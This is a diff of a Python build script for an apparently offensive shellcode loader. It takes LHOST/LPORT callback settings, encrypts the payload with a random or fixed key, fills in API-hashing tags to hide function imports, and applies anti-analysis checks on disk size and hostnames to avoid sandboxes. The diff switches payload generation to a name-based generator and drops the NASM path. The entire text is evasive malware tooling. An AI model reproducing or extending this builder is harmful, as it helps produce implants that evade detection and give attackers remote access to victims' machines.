@@ -11,21 +11,18 @@ config.read(".conf")
 
 # CONFIG = parse_config(config)
 
-ENCRYPTION_METHOD = config.get("Payload", "encryption_method")
-ROR_VALUE = config.getint("Payload", "ror_value")
-ENCRYPTION_KEY = config.get("Payload", "encryption_key")
-PAYLOAD_FILE = config.get("Payload", "file")
+def is_set(value):
+    return value != None and value != ""
 
-LHOST = config.get("Payload", "lhost")
-LPORT = config.getint("Payload", "lport")
-USER_AGENT = config.get("Payload","user_agent")
+ENCRYPTION_METHOD = config.get("Payload", "encryption_method")
+ENCRYPTION_KEY = config.get("Payload", "encryption_key")
 
 STUB_FILE = config.get("Stub", "filename")
 
 DISK_SIZE = config.get("Anti-Analysis", "disk_size")
 TARGET_HOSTNAME = config.get("Anti-Analysis", "target_hostname")
 AVOID_HOSTNAME = config.get("Anti-Analysis", "avoid_hostname").split(",")
-if len(AVOID_HOSTNAME) == 1 and AVOID_HOSTNAME[0] == "":
+if len(AVOID_HOSTNAME) <= 1 and AVOID_HOSTNAME[0] == "":
     AVOID_HOSTNAME = []
 
 WORKING_FOLDER = "temp/"
@@ -33,27 +30,32 @@ WORKING_FOLDER = "temp/"
 
 def main():
 
-    if config.get("Payload", "encryption_key") == "rand":
+    if "rand" in config.get("Payload", "encryption_key"):
         ENCRYPTION_KEY = generate_high_entropy_int(0x1111, 0xFFFF)
     else:
         ENCRYPTION_KEY = int(config.get("Payload", "encryption_key"),16)
 
+    LHOST = config.get("Payload", "lhost") if is_set(config.get("Payload", "lhost")) else None
+    LPORT = config.getint("Payload", "lport") if is_set(config.get("Payload", "lport")) else None
+
+
+    if is_set(config.get("Payload", "name")):
+        PAYLOAD_NAME = config.get("Payload", "name")
+        generate_payload(PAYLOAD_NAME, LHOST, LPORT)
+        PAYLOAD_FILE = "payload.txt"
+    else:
+        print("No payload file or payload name specified")
+        sys.exit(1)
+
     print("===========CONFIG==========")
-    print(f"ROR value: {ROR_VALUE}")
-    print(f"Encryption byte: {ENCRYPTION_KEY}")
-    print(f"Payload file: {PAYLOAD_FILE}")
+    print(f"Encryption byte: {hex(ENCRYPTION_KEY)}")
+    print(f"Payload : {PAYLOAD_FILE} {PAYLOAD_NAME}")
+    print(f"LHOST : {LHOST}")
+    print(f"LPORT : {LPORT}")
     print("===========================\n")
 
     print("===========PAYLOAD==============")
-    if PAYLOAD_FILE.endswith(".nasm") or PAYLOAD_FILE.endswith(".asm"):
-        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%ROR_VALUE%", hex(ROR_VALUE))
-        
-        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LPORT%", hex(LPORT))
-        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST%", LHOST.replace('"',''))
-        sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%USER-AGENT%", USER_AGENT.replace('"',''))
 
-        if LHOST.count(".") == 3:
-            sed_file(WORKING_FOLDER+PAYLOAD_FILE, "%LHOST__LPORT%", format_lhost_lport(LHOST,LPORT))
 
     all_tags = extract_tags_from_folder(WORKING_FOLDER)
 
@@ -63,8 +65,6 @@ def main():
         # Tags like %HASH__MODULE__FUNCTION% are replaced by their hash
         for tag in tags:
             parts = tag.replace("%", "").split("__")
-            if parts[0] == "HASH":
-                sed_file(WORKING_FOLDER+filename, tag, hex(hash(parts[1], parts[2], ROR_VALUE)))
             if parts[0] == "MODHASH":
                 sed_file(WORKING_FOLDER+filename, tag, hash_obj(parts[1],""))
             if parts[0] == "FCTHASH":
@@ -94,9 +94,7 @@ def main():
                         sed_file(WORKING_FOLDER+filename, tag, "{0, 0, false}")
 
 
-    if PAYLOAD_FILE.endswith(".nasm") or PAYLOAD_FILE.endswith(".asm"):
-        instructions = nasm2instructions(WORKING_FOLDER+PAYLOAD_FILE)
-    elif PAYLOAD_FILE.endswith(".bin") or PAYLOAD_FILE.endswith(".raw"):
+    if PAYLOAD_FILE.endswith(".bin") or PAYLOAD_FILE.endswith(".raw"):
         instructions = bin2instructions(WORKING_FOLDER+PAYLOAD_FILE)
     elif PAYLOAD_FILE.endswith(".txt"):
         instructions = txt2instructions(WORKING_FOLDER+PAYLOAD_FILE)
